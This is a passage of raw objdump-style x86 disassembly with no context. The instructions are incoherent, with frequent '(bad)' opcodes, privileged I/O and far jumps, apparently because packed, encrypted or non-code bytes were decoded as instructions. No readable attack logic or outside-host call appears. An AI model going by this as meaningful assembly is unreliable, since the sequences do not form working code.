  41cde9:	xor    bh,BYTE PTR [edx+0x1280c315]
  41cdef:	mov    esp,0x7ff7a25b
  41cdf4:	outs   dx,BYTE PTR ds:[esi]
  41cdf5:	dec    eax
  41cdf6:	adc    dh,dh
  41cdf8:	fdiv   DWORD PTR [eax-0x6ad7f241]
  41cdfe:	pop    esp
  41cdff:	(bad)  
  41ce01:	sub    al,0xfb
  41ce03:	xchg   esi,eax
  41ce04:	jecxz  0x41ce18
  41ce06:	fsubr  st,st(6)
  41ce08:	and    esi,DWORD PTR [ebx+eax*1+0x633329a9]
  41ce0f:	inc    edx
  41ce10:	or     al,0xfe
  41ce12:	mov    BYTE PTR [eax+0x6626f8a0],ah
  41ce18:	das    
  41ce19:	int3   
  41ce1a:	stos   DWORD PTR es:[edi],eax
  41ce1b:	push   esi
  41ce1c:	jmp    0xb71b3d94
  41ce21:	push   cs
  41ce22:	push   cs
  41ce23:	test   BYTE PTR [esi+0x274523e],ch
  41ce29:	dec    ebp
  41ce2a:	jmp    0xed9c0cb0
  41ce2f:	inc    esp
  41ce30:	int3   
  41ce31:	imul   ebp,DWORD PTR [edx-0x7e],0x416b2714
  41ce38:	aas    
  41ce39:	mov    ds:0x131fc0c7,eax
  41ce3e:	sahf   
  41ce3f:	pop    edx
  41ce40:	add    BYTE PTR [eax],al
  41ce42:	pop    es
  41ce43:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  41ce49:	pop    ds
  41ce4a:	xchg   BYTE PTR [ebx],bl
  41ce4c:	mov    edx,0xe4f339d0
  41ce51:	(bad)  [edx+0x26000145]
  41ce57:	add    eax,DWORD PTR [eax]
  41ce59:	add    BYTE PTR [eax+0x5dcb236c],bh
  41ce5f:	or     cl,BYTE PTR [edi]
  41ce61:	push   ebx
  41ce62:	add    BYTE PTR [ebp+0x53b1cdee],ah
  41ce68:	cli    
  41ce69:	mov    bl,0x8e
  41ce6b:	clc    
  41ce6c:	cmc    
  41ce6d:	clc    
  41ce6e:	fcomp  QWORD PTR [ecx]
  41ce70:	inc    ebp
  41ce71:	scas   eax,DWORD PTR es:[edi]
  41ce72:	xor    eax,0x6f400f71
  41ce77:	jecxz  0x41ce99
  41ce79:	add    ebx,esi
  41ce7b:	inc    ebp
  41ce7c:	add    ecx,DWORD PTR [esi-0x6eb25c7e]
  41ce82:	stc    
  41ce83:	repnz sbb al,0x8
  41ce86:	js     0x41ce8b
  41ce88:	sbb    BYTE PTR [edi],cl
  41ce8a:	jmp    0x5316e355
  41ce8f:	jns    0x2af1fefc
  41ce95:	xor    DWORD PTR [eax+0x4d56a210],esp
  41ce9b:	(bad)  
  41ce9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce9e:	shl    DWORD PTR [edx+ebp*2],0x78
  41cea2:	jmp    0x8ad9:0x9a908127
  41cea9:	std    
  41ceaa:	mov    eax,ds:0xfcb78d32
  41ceaf:	(bad)  
  41ceb0:	jp     0x41ce4b
  41ceb2:	mov    ch,BYTE PTR [eax-0x50472884]
  41ceb8:	loope  0x41cf10
  41ceba:	clc    
  41cebb:	int    0xf7
  41cebd:	sahf   
  41cebe:	jg     0x41cf2f
  41cec0:	retf   
  41cec1:	repnz cld 
  41cec3:	adc    ah,BYTE PTR ds:0x6a193fc6
  41cec9:	jge    0x41cee5
  41cecb:	pushf  
  41cecc:	sub    eax,0x2bf75719
  41ced1:	data16 (bad) 
  41ced3:	xchg   esp,eax
  41ced4:	add    esi,DWORD PTR [edi+ebx*8]
  41ced7:	fdiv   st(5),st
  41ced9:	or     ch,BYTE PTR [eax]
  41cedb:	mov    ah,0x2c
  41cedd:	cmp    dh,al
  41cedf:	scas   eax,DWORD PTR es:[edi]
  41cee0:	rcl    BYTE PTR [ecx],1
  41cee2:	dec    ebx
  41cee3:	or     al,0x56
  41cee5:	cmp    edi,0xffffffcc
  41cee8:	push   eax
  41cee9:	jo     0x41cf35
  41ceeb:	adc    al,0xe7
  41ceed:	dec    BYTE PTR [edx-0xd]
  41cef0:	jmp    FWORD PTR [edi]
  41cef2:	jle    0x41cece
  41cef4:	hlt    
  41cef5:	nop
  41cef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cef7:	(bad)  
  41cef9:	jmp    0x43b9:0xadf7a43d
  41cf00:	push   0x8c55c0e
  41cf05:	push   cs
  41cf06:	mov    ss,WORD PTR [edi-0xb]
  41cf09:	add    BYTE PTR [edx-0xa355e16],dl
  41cf0f:	or     al,0xe6
  41cf11:	je     0x41ce9a
  41cf13:	data16 mov bl,0x2c
  41cf16:	sbb    DWORD PTR [ecx+0x88ee8e7],0x1fa8c46f
  41cf20:	outs   dx,DWORD PTR ds:[esi]
  41cf21:	dec    esi
  41cf22:	outs   dx,DWORD PTR ds:[esi]
  41cf23:	data16 js 0x41cf54
  41cf26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf28:	push   eax
  41cf29:	lds    edx,FWORD PTR [esi+0x16436e4d]
  41cf2f:	inc    edx
  41cf30:	aam    0x83
  41cf32:	xchg   edx,eax
  41cf33:	lds    edi,FWORD PTR ds:0x316206f0
  41cf39:	xchg   ebp,eax
  41cf3a:	inc    ecx
  41cf3b:	sbb    al,BYTE PTR [ebp+esi*8-0x164d2dfd]
  41cf42:	push   ds
  41cf43:	sahf   
  41cf44:	cld    
  41cf45:	jno    0x41cfb6
  41cf47:	mov    eax,0x8ad058cf
  41cf4c:	add    DWORD PTR [ebx-0x502e3b2e],edx
  41cf52:	rol    DWORD PTR [edi],cl
  41cf54:	adc    BYTE PTR [ebx-0x5aa82ce],0x89
  41cf5b:	jns    0x41cfd5
  41cf5d:	cli    
  41cf5e:	(bad)  
  41cf5f:	push   eax
  41cf60:	cmp    eax,0x3ae14feb
  41cf65:	pushf  
  41cf66:	out    dx,al
  41cf67:	adc    DWORD PTR [ecx-0x5000b54a],eax
  41cf6d:	add    eax,edx
  41cf6f:	mov    ch,0xd2
  41cf71:	jecxz  0x41cfc7
  41cf73:	mov    ?,WORD PTR [ebx]
  41cf75:	aam    0x9a
  41cf77:	xchg   esp,eax
  41cf78:	scas   al,BYTE PTR es:[edi]
  41cf79:	sub    bh,dl
  41cf7b:	sbb    DWORD PTR [ebx-0x6476021f],0xffffff8f
  41cf82:	pop    esp
  41cf83:	push   edi
  41cf84:	pop    esp
  41cf85:	gs push es
  41cf87:	mov    edi,esi
  41cf89:	sbb    eax,0x333fa912
  41cf8e:	pop    ebx
  41cf8f:	pop    ebp
  41cf90:	aam    0xd
  41cf92:	ret    0x9fdf
  41cf95:	lds    esi,FWORD PTR [eax-0x35]
  41cf98:	xor    eax,0xaadd1cde
  41cf9d:	dec    DWORD PTR [esi+0x4a0063b8]
  41cfa3:	js     0x41cf41
  41cfa5:	cmp    BYTE PTR ds:[eax-0x17],cl
  41cfa9:	int    0xc9
  41cfab:	lock xchg edx,eax
  41cfad:	or     eax,0x63f6252e
  41cfb2:	imul   esp,DWORD PTR [edi+0x26],0x52
  41cfb6:	jno    0x41cf5c
  41cfb8:	ret    
  41cfb9:	inc    edx
  41cfba:	scas   al,BYTE PTR es:[edi]
  41cfbb:	jns    0x41cfa5
  41cfbd:	aad    0x85
  41cfbf:	and    ecx,DWORD PTR [eax+0x3c]
  41cfc2:	pop    eax
  41cfc3:	dec    edi
  41cfc4:	and    al,BYTE PTR [edi+0x1710175e]
  41cfca:	js     0x41d039
  41cfcc:	shl    DWORD PTR [eax],0xcc
  41cfcf:	addr16 loope 0x41cfed
  41cfd2:	lar    esi,bx
  41cfd5:	loop   0x41cf97
  41cfd7:	sbb    DWORD PTR [ecx-0x4941907e],ecx
  41cfdd:	sub    DWORD PTR [ebp+0x3f],ebp
  41cfe0:	fsubr  st,st(5)
  41cfe2:	push   esi
  41cfe3:	jmp    0x2170:0x9ee53e75
  41cfea:	add    DWORD PTR [esi],ecx
  41cfec:	pop    eax
  41cfed:	pusha  
  41cfee:	scas   al,BYTE PTR es:[edi]
  41cfef:	dec    ecx
  41cff0:	mul    DWORD PTR [ebx-0x26]
  41cff3:	sub    eax,0xbc5bf00c
  41cff8:	or     BYTE PTR [ebx-0x6ac085c3],ch
  41cffe:	pushf  
  41cfff:	push   cs
  41d000:	adc    ch,dh
  41d002:	adc    dl,cl
  41d004:	cmp    eax,0x47417238
  41d009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d00a:	outs   dx,BYTE PTR ds:[esi]
  41d00b:	test   al,bl
  41d00d:	xor    DWORD PTR [ebp-0x7af3f0fc],edx
  41d013:	jmp    0xa361902c
  41d018:	pop    ss
  41d019:	loop   0x41cffb
  41d01b:	retf   0xf829
  41d01e:	loope  0x41d06e
  41d020:	cli    
  41d021:	dec    ebp
  41d022:	jle    0x41d087
  41d024:	push   eax
  41d025:	jg     0x41d061
  41d027:	(bad)  [edx-0xb]
  41d02a:	add    eax,0x87a1a8cb
  41d02f:	scas   eax,DWORD PTR es:[edi]
  41d030:	or     al,0xd6
  41d032:	leave  
  41d033:	jl     0x41d044
  41d035:	dec    ecx
  41d036:	pop    ebp
  41d037:	leave  
  41d038:	call   FWORD PTR [eax-0x18]
  41d03b:	and    edx,edi
  41d03d:	call   0xfb85:0x551206fa
  41d044:	bound  bx,DWORD PTR [eax+esi*8+0x723f77b]
  41d04c:	mov    bl,0xce
  41d04e:	mov    eax,ds:0x894df01f
  41d053:	fiadd  DWORD PTR [esi-0x2cde0922]
  41d059:	adc    al,0x2a
  41d05b:	inc    ecx
  41d05c:	stos   BYTE PTR es:[edi],al
  41d05d:	into   
  41d05e:	mov    ebx,0x960a1aca
  41d063:	jge    0x41d078
  41d065:	jmp    0x51d2fec3
  41d06a:	push   ss
  41d06b:	mov    esp,0xedeaad32
  41d070:	clc    
  41d071:	dec    eax
  41d072:	xchg   esi,eax
  41d073:	or     al,0x84
  41d075:	xchg   edx,eax
  41d076:	mov    bl,0xee
  41d078:	sar    BYTE PTR [ecx],0x98
  41d07b:	out    dx,eax
  41d07c:	loope  0x41d0b9
  41d07e:	pop    eax
  41d07f:	imul   edi,DWORD PTR [ecx],0x25
  41d082:	mov    ds:0x78ef7253,eax
  41d087:	mov    esi,0x922fb3d
  41d08c:	jmp    0x41d031
  41d08e:	add    DWORD PTR [ebx+0x2b],esp
  41d091:	xchg   esi,eax
  41d092:	imul   esi,DWORD PTR [eax+0x5d0729d],0xaacd6faf
  41d09c:	jae    0x41d0c6
  41d09e:	adc    DWORD PTR [edx-0x7852bf4d],0xffffffe1
  41d0a5:	iret   
  41d0a6:	sbb    DWORD PTR [edi-0x35],edi
  41d0a9:	mov    edx,DWORD PTR [esi]
  41d0ab:	test   al,0x53
  41d0ad:	mov    cl,0x9a
  41d0af:	mov    esi,DWORD PTR [ebp+0x612578db]
  41d0b5:	mov    al,ds:0xd9433283
  41d0ba:	mov    edi,DWORD PTR [edi]
  41d0bc:	out    dx,eax
  41d0bd:	jecxz  0x41d059
  41d0bf:	pop    ebp
  41d0c0:	arpl   sp,di
  41d0c2:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41d0c4:	lea    esi,[ebx]
  41d0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0c7:	jmp    0x41d060
  41d0c9:	iret   
  41d0ca:	stc    
  41d0cb:	inc    esp
  41d0cc:	out    0x8a,eax
  41d0ce:	hlt    
  41d0cf:	daa    
  41d0d0:	loopne 0x41d0b5
  41d0d2:	adc    al,BYTE PTR [edx+0x1a]
  41d0d5:	pushf  
  41d0d6:	shr    BYTE PTR [ebp*1-0x43606117],cl
  41d0dd:	rol    DWORD PTR [esi],0x43
  41d0e0:	mov    esi,ds
  41d0e2:	fistp  WORD PTR ds:0xb55f3819
  41d0e8:	push   edx
  41d0e9:	test   DWORD PTR [ebx-0x7cd7614c],esi
  41d0ef:	ret    
  41d0f0:	mov    DWORD PTR [ecx-0x24],eax
  41d0f3:	xchg   DWORD PTR [ebp+edi*8-0x111f7e19],edi
  41d0fa:	shr    BYTE PTR [esi+0xf],0x41
  41d0fe:	sub    al,0xbc
  41d100:	or     edx,DWORD PTR [ecx+0x4]
  41d103:	add    edx,esp
  41d105:	icebp  
  41d106:	in     eax,dx
  41d107:	sub    esp,DWORD PTR [ecx]
  41d109:	adc    eax,0x17b7d58f
  41d10e:	and    BYTE PTR [ebp-0x7996b428],cl
  41d114:	out    0x58,eax
  41d116:	mov    ecx,DWORD PTR [eax-0x39ca517e]
  41d11c:	xchg   ebp,eax
  41d11d:	iret   
  41d11e:	fwait
  41d11f:	(bad)  
  41d120:	push   ss
  41d121:	sbb    BYTE PTR [esi+0x19e0a91e],bh
  41d127:	xor    ebx,esp
  41d129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d12a:	dec    ebp
  41d12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d12c:	ret    0xbfb3
  41d12f:	retf   
  41d130:	jne    0x41d155
  41d132:	sbb    BYTE PTR [eax],ch
  41d134:	fcmove st,st(3)
  41d136:	mov    ds:0x43c5bb1c,al
  41d13b:	ret    
  41d13c:	or     BYTE PTR [ecx-0x13],bh
  41d13f:	fs push es
  41d141:	lods   eax,DWORD PTR ds:[esi]
  41d142:	adc    edi,edx
  41d144:	pop    ss
  41d145:	ins    DWORD PTR es:[edi],dx
  41d146:	mov    BYTE PTR [ebp+0x3d],ch
  41d149:	pushf  
  41d14a:	imul   ebp,DWORD PTR [eax-0x3c],0xef41bc53
  41d151:	xor    BYTE PTR [eax],0x5e
  41d154:	push   ebx
  41d155:	das    
  41d156:	fimul  DWORD PTR [ebx-0x77]
  41d159:	mov    eax,ds:0x6ec829fa
  41d15e:	loopne 0x41d1b7
  41d160:	dec    ebx
  41d161:	aam    0x4a
  41d163:	not    esp
  41d165:	jecxz  0x41d117
  41d167:	push   es
  41d168:	ror    BYTE PTR [ecx],cl
  41d16a:	mov    bl,0x85
  41d16c:	dec    ecx
  41d16d:	xchg   ebp,esp
  41d16f:	ss retf 0x7cd4
  41d173:	pop    ds
  41d174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d175:	or     esp,edx
  41d177:	sub    DWORD PTR [ebp-0x2ab3d5c1],edx
  41d17d:	xchg   BYTE PTR [esi+0x46],dh
  41d180:	add    BYTE PTR [eax],al
  41d182:	push   ds
  41d183:	add    al,0xa7
  41d185:	(bad)  
  41d186:	mov    edi,0xf6dd7ee7
  41d18b:	jp     0x41d156
  41d18d:	push   esi
  41d18e:	xchg   esi,eax
  41d18f:	rcr    DWORD PTR [edx],cl
  41d191:	sbb    esi,DWORD PTR [eax+0x26000148]
  41d197:	add    eax,DWORD PTR [eax]
  41d199:	add    BYTE PTR [eax-0x5a6b3f66],al
  41d19f:	aas    
  41d1a0:	and    DWORD PTR [esi],ebx
  41d1a2:	(bad)  
  41d1a3:	jbe    0x41d1d1
  41d1a5:	push   esi
  41d1a6:	rol    BYTE PTR [ecx+0x51],1
  41d1a9:	add    BYTE PTR [ecx],0xb4
  41d1ac:	mov    edx,0x4fde64ca
  41d1b1:	mov    gs,WORD PTR [ebx]
  41d1b3:	push   0x60ee5038
  41d1b8:	out    0x8e,al
  41d1ba:	and    eax,0xd8389304
  41d1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1c0:	fwait
  41d1c1:	mov    ebp,DWORD PTR [ecx]
  41d1c3:	dec    esi
  41d1c4:	std    
  41d1c5:	sbb    eax,DWORD PTR ds:0xfe58397e
  41d1cb:	pop    ss
  41d1cc:	cmp    bh,BYTE PTR [esi+0x7a]
  41d1cf:	mov    gs,WORD PTR [ecx]
  41d1d1:	cli    
  41d1d2:	lods   eax,DWORD PTR ds:[esi]
  41d1d3:	xor    bh,BYTE PTR [ebp+0x5e5f9a9c]
  41d1d9:	mov    bh,0xe0
  41d1db:	out    0xf9,al
  41d1dd:	cmp    BYTE PTR [ebx-0x19a7335d],ah
  41d1e3:	push   cs
  41d1e4:	iret   
  41d1e5:	das    
  41d1e6:	nop
  41d1e7:	je     0x41d175
  41d1e9:	lods   al,BYTE PTR ds:[esi]
  41d1ea:	add    BYTE PTR [ecx-0x65],bh
  41d1ed:	jmp    0x6b9d:0x3dd65a38
  41d1f4:	fimul  WORD PTR [ebx]
  41d1f6:	sar    BYTE PTR fs:[ebx-0x44],1
  41d1fa:	pop    ecx
  41d1fb:	inc    eax
  41d1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1fe:	neg    DWORD PTR [eax+ebx*4-0x72]
  41d202:	push   esi
  41d203:	scas   eax,DWORD PTR es:[edi]
  41d204:	data16 add bh,al
  41d207:	xor    BYTE PTR [edi+0x737d6ecd],ah
  41d20d:	dec    ebp
  41d20e:	retf   
  41d20f:	call   0x1e54b3ed
  41d214:	in     al,0x2d
  41d216:	inc    esp
  41d217:	cmp    ebx,DWORD PTR [ebp-0x51]
  41d21a:	add    BYTE PTR [ebx+edi*4],dl
  41d21d:	sbb    edx,DWORD PTR es:[edi]
  41d220:	fidivr DWORD PTR [edi-0x30c40ce7]
  41d226:	test   DWORD PTR [ecx+esi*2-0x7a],ecx
  41d22a:	mov    dh,0x2c
  41d22c:	pop    ecx
  41d22d:	fimul  WORD PTR [edi-0x61c2374c]
  41d233:	xor    BYTE PTR [edx+0x11],cl
  41d236:	loope  0x41d20f
  41d238:	jmp    0x41d25b
  41d23a:	or     ecx,DWORD PTR [ecx]
  41d23c:	inc    eax
  41d23d:	jl     0x41d2a4
  41d23f:	jle    0x41d1f3
  41d241:	push   ecx
  41d242:	js     0x41d2b1
  41d244:	mov    ebx,0xe0876b84
  41d249:	sti    
  41d24a:	(bad)  
  41d24b:	retf   
  41d24c:	fwait
  41d24d:	or     eax,0x421ad54b
  41d252:	push   ecx
  41d253:	dec    ecx
  41d254:	inc    edi
  41d255:	stc    
  41d256:	sbb    DWORD PTR [ecx+0x2a0acae2],eax
  41d25c:	pop    ebp
  41d25d:	imul   BYTE PTR [ecx+0x9e25142]
  41d263:	jle    0x41d1f0
  41d265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d266:	loope  0x41d210
  41d268:	push   esp
  41d269:	aam    0xf3
  41d26b:	push   esi
  41d26c:	dec    esp
  41d26d:	ficomp WORD PTR [ecx]
  41d26f:	jmp    0x41d1f4
  41d271:	and    BYTE PTR [ecx-0x6c],dh
  41d274:	sub    DWORD PTR [edx],0x54
  41d277:	inc    ecx
  41d278:	stc    
  41d279:	lahf   
  41d27a:	xchg   ebp,eax
  41d27b:	clc    
  41d27c:	sti    
  41d27d:	icebp  
  41d27e:	mov    BYTE PTR [ebx-0x1b419207],dl
  41d284:	daa    
  41d285:	shl    BYTE PTR [ebp-0x6a],cl
  41d288:	sub    dh,BYTE PTR [ebp+0x2e]
  41d28b:	in     eax,dx
  41d28c:	mov    ebx,0x4e941457
  41d291:	cmp    eax,0xf1303f25
  41d296:	gs loope 0x41d267
  41d299:	add    dl,BYTE PTR [ebx+0x51f7181]
  41d29f:	fimul  WORD PTR [ecx]
  41d2a1:	pop    es
  41d2a2:	adc    al,bh
  41d2a4:	push   ss
  41d2a5:	mov    edx,0x72627c23
  41d2aa:	cwde   
  41d2ab:	stc    
  41d2ac:	arpl   WORD PTR [eax+0x62c966bb],sp
  41d2b2:	and    BYTE PTR [ebp+eax*8-0x19],dh
  41d2b6:	push   0xffffffbd
  41d2b8:	iret   
  41d2b9:	adc    ax,0x9c56
  41d2bd:	ins    DWORD PTR es:[edi],dx
  41d2be:	add    al,0xdb
  41d2c0:	ins    DWORD PTR es:[edi],dx
  41d2c1:	ret    
  41d2c2:	pop    es
  41d2c3:	add    ah,dl
  41d2c5:	xor    BYTE PTR [esi+0x4bf0f728],0x7c
  41d2cc:	outs   dx,BYTE PTR ds:[esi]
  41d2cd:	mov    ebp,0x7e8e0123
  41d2d2:	(bad)  
  41d2d4:	fldcw  WORD PTR [eax]
  41d2d6:	sub    DWORD PTR [ecx+0x18],ecx
  41d2d9:	and    BYTE PTR [edi-0x6f],dh
  41d2dc:	mov    edx,0x401a8c49
  41d2e1:	loopne 0x41d27a
  41d2e3:	adc    ecx,edx
  41d2e5:	sbb    esi,ebx
  41d2e7:	ds mov esi,0xa2f6b65c
  41d2ed:	inc    eax
  41d2ee:	les    ebp,FWORD PTR ds:0xa52ccb24
  41d2f4:	inc    ebx
  41d2f5:	js     0x41d293
  41d2f7:	mov    dl,0x1b
  41d2f9:	out    dx,al
  41d2fa:	loope  0x41d2c0
  41d2fc:	xor    edx,DWORD PTR [ebx]
  41d2fe:	das    
  41d2ff:	lds    esi,FWORD PTR [esi-0x2fb562b9]
  41d305:	test   eax,0x810d66d9
  41d30a:	add    ecx,DWORD PTR [esi-0x26]
  41d30d:	inc    ebx
  41d30e:	mov    eax,DWORD PTR [ecx]
  41d310:	sbb    bh,ch
  41d312:	(bad)  
  41d313:	and    BYTE PTR [esi-0x4e],cl
  41d316:	xchg   edi,eax
  41d317:	rol    BYTE PTR [edx-0x13c73699],0xc3
  41d31e:	fs (bad) 
  41d320:	mov    esp,0xb9d8d5fc
  41d325:	hlt    
  41d326:	call   0x23910978
  41d32b:	aam    0x51
  41d32d:	mov    eax,0x418dd53b
  41d332:	(bad)  
  41d333:	push   ds
  41d334:	mov    ds:0x5b0bba2a,eax
  41d339:	sti    
  41d33a:	and    esp,DWORD PTR [ecx+0x8]
  41d33d:	repnz aam 0xf6
  41d340:	jns    0x41d30e
  41d342:	ja     0x41d2c8
  41d344:	out    0x5,eax
  41d346:	add    bh,dh
  41d348:	cmp    DWORD PTR [edx+0x4a],0xffffffdb
  41d34c:	dec    esp
  41d34d:	mov    ds:0x9668fe49,eax
  41d352:	inc    ebx
  41d353:	sahf   
  41d354:	popf   
  41d355:	adc    dl,BYTE PTR [ebx-0xe]
  41d358:	aad    0xc5
  41d35a:	mov    esi,0xcde12607
  41d35f:	xchg   ebx,eax
  41d360:	inc    edi
  41d361:	loope  0x41d2fb
  41d363:	call   0xdd69:0x2cd5a0b4
  41d36a:	in     eax,0x7a
  41d36c:	xchg   ecx,eax
  41d36d:	iret   
  41d36e:	pop    es
  41d36f:	test   eax,0x97d9a720
  41d374:	fnstenv [edx-0x374a3d9f]
  41d37a:	pop    edi
  41d37b:	out    dx,eax
  41d37c:	pop    ecx
  41d37d:	pop    esi
  41d37e:	pop    esp
  41d37f:	pmaxsw mm7,QWORD PTR es:[ebx]
  41d383:	imul   ebx,DWORD PTR [eax-0x18d4bdb2],0xffffffbb
  41d38a:	xchg   esp,eax
  41d38b:	sub    al,0xf3
  41d38d:	and    DWORD PTR [ebx+0x32f805b1],0x7a
  41d394:	shr    ebx,cl
  41d396:	inc    eax
  41d397:	retf   0x4d22
  41d39a:	lods   eax,DWORD PTR ds:[esi]
  41d39b:	jns    0x41d331
  41d39d:	in     eax,0x4a
  41d39f:	inc    ecx
  41d3a0:	xchg   esp,eax
  41d3a1:	xchg   esi,eax
  41d3a2:	xor    al,0xec
  41d3a4:	dec    edx
  41d3a5:	sbb    al,0xdc
  41d3a7:	and    BYTE PTR [ebx+ebp*2],al
  41d3aa:	lods   eax,DWORD PTR ds:[esi]
  41d3ab:	jb     0x41d3dc
  41d3ad:	(bad)  
  41d3ae:	sbb    BYTE PTR [ecx],bl
  41d3b0:	add    eax,eax
  41d3b2:	push   cs
  41d3b3:	jle    0x41d34a
  41d3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3b6:	mov    DWORD PTR [ebp+0x77],edx
  41d3b9:	jnp    0x41d387
  41d3bb:	mov    edi,0xd0ec24
  41d3c0:	ss dec esp
  41d3c2:	sahf   
  41d3c3:	rcl    ebp,1
  41d3c5:	(bad)  
  41d3c6:	shr    edx,1
  41d3c8:	call   0x205436a8
  41d3cd:	pusha  
  41d3ce:	adc    DWORD PTR [edi],ebx
  41d3d0:	mov    dl,0x7d
  41d3d2:	pop    ebx
  41d3d3:	xchg   esp,eax
  41d3d4:	mov    al,0x45
  41d3d6:	mov    al,ds:0x8a742c40
  41d3db:	imul   ebp,DWORD PTR [esi+0x2a],0xe0ccb0b6
  41d3e2:	scas   al,BYTE PTR es:[edi]
  41d3e3:	push   esi
  41d3e4:	sbb    cl,BYTE PTR [ecx+0x55]
  41d3e7:	add    ebx,DWORD PTR [ecx]
  41d3e9:	xchg   DWORD PTR [ecx+0x5217396f],esi
  41d3ef:	cmp    al,0x29
  41d3f1:	push   edx
  41d3f2:	fsub   st(2),st
  41d3f4:	sub    bh,BYTE PTR [edx]
  41d3f6:	adc    eax,0xa733887d
  41d3fb:	gs jle 0x41d3c0
  41d3fe:	sahf   
  41d3ff:	iret   
  41d400:	or     ah,dh
  41d402:	fidivr WORD PTR [edi+0x4ee875be]
  41d408:	or     eax,0xf947c606
  41d40d:	ret    
  41d40e:	loope  0x41d3b4
  41d410:	cmp    cl,dh
  41d412:	(bad)  
  41d413:	out    dx,al
  41d414:	inc    ebp
  41d415:	shr    ebp,1
  41d417:	pop    eax
  41d418:	aas    
  41d419:	(bad)  
  41d41a:	fcmovnbe st,st(4)
  41d41c:	call   0x9aa86fb1
  41d421:	jae    0x41d43b
  41d423:	int    0x58
  41d425:	sti    
  41d426:	addr16 sub al,0x55
  41d429:	inc    DWORD PTR [ecx-0x6e5043a0]
  41d42f:	fisub  DWORD PTR [edi]
  41d431:	and    al,BYTE PTR [edi-0x46c151f4]
  41d437:	pop    edx
  41d438:	jnp    0x41d432
  41d43a:	test   eax,0x52c8d5cd
  41d43f:	shr    BYTE PTR [eax+0x25fdaf68],cl
  41d445:	shl    WORD PTR [edi+0x1d],1
  41d449:	and    DWORD PTR [ebx+0xe],ebx
  41d44c:	jle    0x41d400
  41d44e:	rcl    DWORD PTR [ebp-0x11],1
  41d451:	add    BYTE PTR [edx-0x4cf169d8],0xb4
  41d458:	jb     0x41d458
  41d45a:	inc    ecx
  41d45b:	imul   ebp,DWORD PTR [edi+0x3f0504a],0x943e1286
  41d465:	and    al,cl
  41d467:	mov    ch,0x8e
  41d469:	dec    eax
  41d46a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d46b:	popf   
  41d46c:	sub    al,0x60
  41d46e:	(bad)  
  41d46f:	dec    ecx
  41d470:	test   eax,0xd8aee0b4
  41d475:	rcr    BYTE PTR [edi-0xf363766],cl
  41d47b:	mov    edi,0xa3613908
  41d480:	loop   0x41d452
  41d482:	jns    0x41d4d7
  41d484:	mov    ah,0x15
  41d486:	lock or al,0x1e
  41d489:	xor    edx,DWORD PTR [edx]
  41d48b:	inc    esp
  41d48c:	test   eax,0x145b5fb1
  41d491:	add    al,0xfb
  41d493:	bound  ebx,QWORD PTR gs:[edx]
  41d496:	cmc    
  41d497:	(bad)  
  41d498:	(bad)  
  41d499:	out    0x89,al
  41d49b:	push   ss
  41d49c:	push   edi
  41d49d:	inc    esp
  41d49e:	mov    ds:0xde8f0328,eax
  41d4a3:	mov    al,0x29
  41d4a5:	inc    eax
  41d4a6:	fs aad 0x26
  41d4a9:	push   0x49
  41d4ab:	retf   
  41d4ac:	daa    
  41d4ad:	and    DWORD PTR [edi],eax
  41d4af:	mov    esp,0x10c2e2e0
  41d4b4:	and    al,0x15
  41d4b6:	call   0xd279:0x5b5e1385
  41d4bd:	dec    ebp
  41d4be:	lock hlt 
  41d4c0:	add    BYTE PTR [eax],al
  41d4c2:	js     0x41d44d
  41d4c4:	hlt    
  41d4c5:	mov    al,0xf5
  41d4c7:	std    
  41d4c8:	jl     0x41d493
  41d4ca:	dec    edi
  41d4cb:	pop    ds
  41d4cc:	cmp    DWORD PTR [ebx+0x13],ebp
  41d4cf:	or     cl,dh
  41d4d1:	or     dl,dh
  41d4d3:	dec    ebx
  41d4d4:	add    DWORD PTR [eax],eax
  41d4d6:	add    eax,DWORD PTR es:[eax]
  41d4d9:	add    BYTE PTR [ebp+edi*1+0x7078e23c],al
  41d4e0:	in     eax,dx
  41d4e1:	mov    bh,0x80
  41d4e3:	les    esi,FWORD PTR [eax]
  41d4e5:	(bad)  
  41d4e6:	jmp    0x5571cf6d
  41d4eb:	into   
  41d4ec:	(bad)  
  41d4ed:	inc    ecx
  41d4ef:	sar    BYTE PTR [ecx-0x72b69286],1
  41d4f5:	pop    eax
  41d4f6:	popf   
  41d4f7:	dec    eax
  41d4f8:	mov    edx,0x410f5df3
  41d4fd:	gs leave 
  41d4ff:	sub    al,0xe9
  41d501:	or     al,0x90
  41d503:	mov    ecx,0xc647378e
  41d508:	iret   
  41d509:	adc    DWORD PTR [esi+0x269f13d1],eax
  41d50f:	and    esi,edi
  41d511:	mov    dl,0x28
  41d513:	leave  
  41d514:	out    dx,al
  41d515:	pop    es
  41d516:	pop    edi
  41d517:	mov    eax,ds:0x257b5148
  41d51c:	mov    ebx,0xbb7fcccc
  41d521:	mov    ebp,0x3ef2639f
  41d526:	mov    edx,DWORD PTR [edi-0x6c]
  41d529:	xchg   esi,eax
  41d52a:	jp     0x41d4dd
  41d52c:	mov    eax,ds:0x284b3aa6
  41d531:	mov    ds:0xf86b204f,eax
  41d536:	or     DWORD PTR [ebp+0x4f310ada],ebx
  41d53c:	mov    ch,BYTE PTR [ebp+eiz*8-0x38]
  41d540:	xchg   BYTE PTR [edx+0xa],dl
  41d543:	jmp    0x3486:0xed571392
  41d54a:	fistp  DWORD PTR ds:0x60d4d149
  41d550:	xor    DWORD PTR [esi-0x7fcb290c],esp
  41d556:	loop   0x41d564
